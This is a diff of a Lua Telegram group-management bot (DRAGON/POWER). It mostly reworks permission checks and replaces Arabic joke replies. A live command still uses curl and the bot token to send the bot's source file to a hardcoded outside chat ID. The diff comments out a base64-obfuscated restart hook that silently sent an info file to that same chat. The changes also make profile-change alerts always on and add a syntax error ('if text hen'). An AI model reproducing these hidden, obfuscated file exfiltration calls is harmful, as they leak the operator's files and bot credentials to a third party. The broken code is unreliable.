-if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
+if text == "تفعيل كتم الاسم" then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_, '☉┇ تم التفعيل الاسماء المكتومه')
 database:set(bot_id.."block:name:stats"..msg.chat_id_,"open")
 end
-if text == "تعطيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
+if text == "تعطيل كتم الاسم" then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل الاسماء المكتومه')
 database:set(bot_id.."block:name:stats"..msg.chat_id_,"close")
 end
@@ -4478,11 +4480,19 @@ local s2 = database:get(bot_id.."DRAGON:nump"..msg.chat_id_) or 5
 send(msg.chat_id_, msg.id_,'☉┇ التوحيد '..s1..'\n ☉┇ عدد الكتم  : '..s2)
 end
 end
-if text == "تفعيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
+if text == "تفعيل التوحيد" then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل التوحيد')
 database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"open")
 end
-if text == "تعطيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
+if text == "تعطيل التوحيد" then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل التوحيد')
 database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"close")
 end
@@ -4508,31 +4518,25 @@ end
 bnnaGet(id, sofi_mrsofi_new)
 end
 end
-if text == "تفعيل تنبيه الاسماء" and Manager2(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
-send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل تنبيه الاسماء')
-database:set(bot_id.."Ttn:DRG:stats"..msg.chat_id_,"open")
-end
-if text == "تعطيل تنبيه الاسماء" and Manager2(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
-send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل تنبيه الاسماء')
-database:set(bot_id.."Ttn:DRG:stats"..msg.chat_id_,"close")
-end
-if text and database:get(bot_id.."Ttn:DRG:stats"..msg.chat_id_) == "open" then 
+if text then 
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then
 local DRAGONChengName = database:get(bot_id.."DRAGON:Cheng:Name"..data.id_)
 if not data.first_name_ then 
 if DRAGONChengName then 
-send(msg.chat_id_, msg.id_, " خوش معرف جان ["..DRAGONChengName..']')
+send(msg.chat_id_, msg.id_, " مش عارف كدا اسمك ماله مش باين 😏 ["..DRAGONChengName..']')
 database:del(bot_id.."DRAGON:Cheng:Name"..data.id_) 
 end
 end
 if data.first_name_ then 
 if DRAGONChengName ~= data.first_name_ then 
 local Text = {
-  "جان خوش اسم يول",
-"ليش غيرته اسمك بس لا خانوك/ج",
-"هذا الحلو غير اسمه 😉",
+  "في اي يسطا ماله اسمك القديم 😂",
+"هاااا غير اسمك لي رجع القديم",
+"اسمك مش عاجبني خليه شبهي ",
+"معرفتكش لنل كدا لمل غيرت اسمك صح",
+"حلو الاسم الجديد",
 }
 send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
 end  
@@ -4542,35 +4546,27 @@ end
 end
 end,nil)   
 end
-if text == "تفعيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
-send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل تنبيه المعرف')
-database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"open")
-end
-if text == "تعطيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
-send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل تنبيه المعرف')
-database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"close")
-end
-if text and database:get(bot_id.."Ttn:Userr:stats"..msg.chat_id_) == "open" then  
+if text hen  
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then
 local DRAGONChengUserName = database:get(bot_id.."DRAGON:Cheng:UserName"..data.id_)
 if not data.username_ then 
 if DRAGONChengUserName then 
-send(msg.chat_id_, msg.id_, 1, "مسح معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..DRAGONChengUserName..']')
+send(msg.chat_id_, msg.id_, 1, "امسكو مسح اليورر بتاعه 😂😂\n اليوزر القديم  : [@"..DRAGONChengUserName..']')
 database:del(bot_id.."DRAGON:Cheng:UserName"..data.id_) 
 end
 end
 if data.username_ then 
 if DRAGONChengUserName ~= data.username_ then 
 local Text = {
-'شكو غيرت معرفك شنو نشروك بقنوات فضايح😂🥺',
-"هاها شو غيرت معرفك بس لا هددتك/ج الحب",
-"شسالفه شو غيرت معرفك 😐🌝",
-"غير معرفه خمطو بساع بساع \n هاذه معرفه : @"..data.username_.."",
-'ها عار مو جان معرفك \n شكو غيرته ل @'..data.username_..' ',
-'ها يول شو مغير معرفك بيش مشتري يول', 
-"منور معرف جديد :  "..data.username_.."",
+'هاا غيرت اليوزر لي كنت في حفله و مقدرتش ولا اي 😂😂',
+"امسك حرامي غير اليوزر دا القديم @"..DRAGONChengUserName.."",
+"غيرت اليوزر لي 😐",
+"حرامي غير اليوزر مسكتو \n دا اليوزر : @"..data.username_.."",
+'عيب يسطا لما انت تكون انت و تغير يوزرك 😶',
+'ها مغير اليوزر ', 
+"منور اليوزر الجديد :  "..data.username_.."",
 }
 send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
 end  
@@ -4580,34 +4576,25 @@ end
 end
 end,nil)   
 end
-if text == "تفعيل تنبيه الصور" and Manager2(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
-send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل تنبيه الصور')
-database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"open")
-end
-if text == "تعطيل تنبيه الصور" and Manager2(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
-send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل تنبيه الصور')
-database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"close")
-end
-if text and database:get(bot_id.."Ttn:Ph:stats"..msg.chat_id_) == "open" then  
+if text then  
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then 
 local DRAGONChengPhoto = database:get(bot_id.."DRAGON:Cheng:Photo"..data.id_)
 if not data.profile_photo_ then 
 if DRAGONChengPhoto then 
-send(msg.chat_id_, msg.id_, "مسح كل صور ابن الحلو شكد غبي لعد😂🥺")
+send(msg.chat_id_, msg.id_, "امسكو مسح صورو الحيوان 😂😂")
 database:del(bot_id.."DRAGON:Cheng:Photo"..data.id_) 
 end
 end
 if data.profile_photo_.big_.persistent_id_ then 
 if DRAGONChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
 local Text = {
-  "شكو غيرت صورتك يلصاك",
-  "منور طالع حلو ع صوره جديده",
-  "ها يول شو غيرت صورتك😍😂",
-  "شكو غيرت صورتك شنو قطيت وحده جديده 😹😹🌚",
-  "شو غيرت صورتك شنو تعاركت ويه الحب ؟😹🌞",
-  "شكو غيرت الصوره شسالفه ؟؟ 🤔🌞",
+  "شيل صورتك احسن",
+  "حلوه الصوره دي",
+  "حاتطه صوره وحده احلي منك لي",
+  "مممممممم مغير الصوره لي ",
+  "شكلك مقموص",
 }
 send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
 end  
@@ -4618,12 +4605,24 @@ end
 end,nil)  
 end
 if text == 'سحب السورس' or text == 'جلب السورس' then 
+if not DEV(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مبرمج السورس لاستخدام هذا الامر')
+return false
+end   
 local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
 send(msg.chat_id_, msg.id_,' جاري ارسال السورس الي المبرمج')
 end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then 
 local Text = [[ 
-☉ 𝐏𝐎𝐖𝐄𝐑  ☉
+☉┇ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ┇☉
+ •┉•┉•┉•┉•┉•••┉•┉•┉•┉•┉•
+☉┇ [AHMEDYAD](t.me/ahmedyad200) ┇☉
+
+☉┇ [TWASL](t.me/AYTSL1BOT) ┇☉
+
+☉┇ [POWER](t.me/SOPOWERB0T) ┇☉
+
+☉┇ [BOT](t.me/SOPOWERBOT) ┇☉
 ]] 
 keyboard = {} 
 keyboard.inline_keyboard = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
@@ -4632,7 +4631,7 @@ https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. 
 end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
-if text == 'رفع نسخه الاحتياطيه' then
+if text == 'رفع الجروبات' then
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
 return false
@@ -4710,14 +4709,18 @@ File:write(t)
 File:close()
 sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './users.json', ' عدد المشتركين { '..#list..'}')
 end
-if text == 'جلب نسخه الاحتياطيه' then
+if text == 'جلب الجروبات' then
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
 return false
 end 
 GetFile_Bot(msg)
 end
-if text == 'الاوامر المضافه' and Constructor(msg) then
+if text == 'الاوامر المضافه' then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_..'')
 t = " ☉┇ قائمه الاوامر المضافه  \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -4744,7 +4747,11 @@ end
 send(msg.chat_id_, msg.id_,' ☉┇ تم ازالة جميع الاوامر المضافه')  
 end
 end
-if text == 'اضف امر' and Constructor(msg) then
+if text == 'اضف امر' then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -4765,7 +4772,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -4791,7 +4798,7 @@ return false
 end
 --------------------------------------------------------------------------------------------------------------
 if text == 'قفل الدردشه' and msg.reply_to_message_id_ == 0 then
-if not Manager2(msg) then
+if not Mod(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
 return false
 end 
@@ -4844,14 +4851,22 @@ database:set(bot_id..'lock:tagservr'..msg.chat_id_,true)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل الاشعارات ')
 end,nil)   
-elseif text == 'قفل التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+elseif text == 'قفل التثبيت' and msg.reply_to_message_id_ == 0 then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id.."lockpin"..msg.chat_id_, true) 
 database:sadd(bot_id..'lock:pin',msg.chat_id_) 
 tdcli_function ({ ID = "GetChannelFull",  channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,data.pinned_message_id_)  end,nil)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل التثبيت ')
 end,nil)   
-elseif text == 'قفل التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+elseif text == 'قفل التعديل' and msg.reply_to_message_id_ == 0 then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id..'lock:edit'..msg.chat_id_,true) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل تعديل ')
@@ -4892,7 +4907,11 @@ database:set(bot_id.."lock:inline"..msg.chat_id_,'del')
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل الانلاين ')
 end,nil)
-elseif text == 'قفل تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+elseif text == 'قفل تعديل الميديا' and msg.reply_to_message_id_ == 0 then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id..'lock_edit_med'..msg.chat_id_,true) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل تعديل ')
@@ -4985,13 +5004,21 @@ database:del(bot_id..'lock:tagservr'..msg.chat_id_)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح الاشعارات ')
 end,nil)   
-elseif text == 'فتح التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+elseif text == 'فتح التثبيت' and msg.reply_to_message_id_ == 0 then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id.."lockpin"..msg.chat_id_)  
 database:srem(bot_id..'lock:pin',msg.chat_id_)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح التثبيت ')
 end,nil)   
-elseif text == 'فتح التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+elseif text == 'فتح التعديل' and msg.reply_to_message_id_ == 0 then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id..'lock:edit'..msg.chat_id_) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح تعديل ')
@@ -5023,7 +5050,11 @@ database:del(bot_id..'lock:Engilsh'..msg.chat_id_)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح الانكليزيه ')
 end,nil)
-elseif text == 'فتح تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+elseif text == 'فتح تعديل الميديا' and msg.reply_to_message_id_ == 0 then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id..'lock_edit_med'..msg.chat_id_) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح تعديل ')
@@ -5199,7 +5230,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل نسبه الانوثه'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل all' and CoSu(msg) then   
+if text == 'تفعيل all' then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Cick:all'..msg.chat_id_) then
 Text = ' ☉┇ تم تفعيل امر @all'
 database:del(bot_id..'Cick:all'..msg.chat_id_)  
@@ -5208,7 +5243,11 @@ Text = ' ☉┇ بالتاكيد تم تفعيل امر @all'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل all' and CoSu(msg) then  
+if text == 'تعطيل all' then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
 database:set(bot_id..'Cick:all'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل امر @all'
@@ -5217,7 +5256,58 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل امر @all'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-
+if text == 'تفعيل قول' then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end  
+if database:get(bot_id..'Speak:after:me'..msg.chat_id_) then
+Text = ' ☉┇ تم تفعيل امر قول'
+database:del(bot_id..'Speak:after:me'..msg.chat_id_)  
+else
+Text = ' ☉┇ بالتاكيد تم تفعيل امر قول'
+end
+send(msg.chat_id_, msg.id_,Text) 
+end
+if text == 'تعطيل قول' then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end  
+if not database:get(bot_id..'Speak:after:me'..msg.chat_id_) then
+database:set(bot_id..'Speak:after:me'..msg.chat_id_,true)  
+Text = '\n ☉┇ تم تعطيل امر قول'
+else
+Text = '\n ☉┇ بالتاكيد تم تعطيل امر قول'
+end
+send(msg.chat_id_, msg.id_,Text) 
+end
+if text == 'تفعيل غنيلي' then   
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end  
+if database:get(bot_id..'sing:for:me'..msg.chat_id_) then
+Text = ' ☉┇ تم تفعيل امر غنيلي الان ارسل غنيلي'
+database:del(bot_id..'sing:for:me'..msg.chat_id_)  
+else
+Text = ' ☉┇ بالتاكيد تم تفعيل امر غنيلي تستطيع ارسال غنيلي'
+end
+send(msg.chat_id_, msg.id_,Text) 
+end
+if text == 'تعطيل غنيلي' then   
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end  
+if not database:get(bot_id..'sing:for:me'..msg.chat_id_) then
+database:set(bot_id..'sing:for:me'..msg.chat_id_,true)  
+Text = '\n ☉┇ تم تعطيل امر غنيلي'
+else
+Text = '\n ☉┇ بالتاكيد تم تعطيل امر غنيلي'
+end
+send(msg.chat_id_, msg.id_,Text) 
+end
 if text == 'قفل التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 database:set(bot_id.."lock:hashtak"..msg.chat_id_,'del')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
@@ -5694,7 +5784,7 @@ return false
 end    
 send(msg.chat_id_, msg.id_, ' ☉┇ تم اعاده تشغيل البوت') 
 dofile('DRAGON.lua')  
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+--io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 end 
 if text == ("مسح الحظر العام") then
 if not DevSoFi(msg) then
@@ -5737,7 +5827,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -5787,7 +5877,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -5842,7 +5932,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -5894,7 +5984,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -5942,7 +6032,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -5996,7 +6086,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6048,7 +6138,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6072,7 +6162,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6099,7 +6189,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6166,7 +6256,11 @@ echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الــدخـ
 echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ مـده تـشغيـل الـسـيـرفـر } ⊰•  \n*»» '"$uptime"'*'
 ]]):read('*all'))  
 end
-if text == "all" or text == "@all" and CoSu(msg) then
+if text == "all" or text == "@all" then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end
 if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
 if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
 return 
@@ -6307,7 +6401,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6328,7 +6422,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
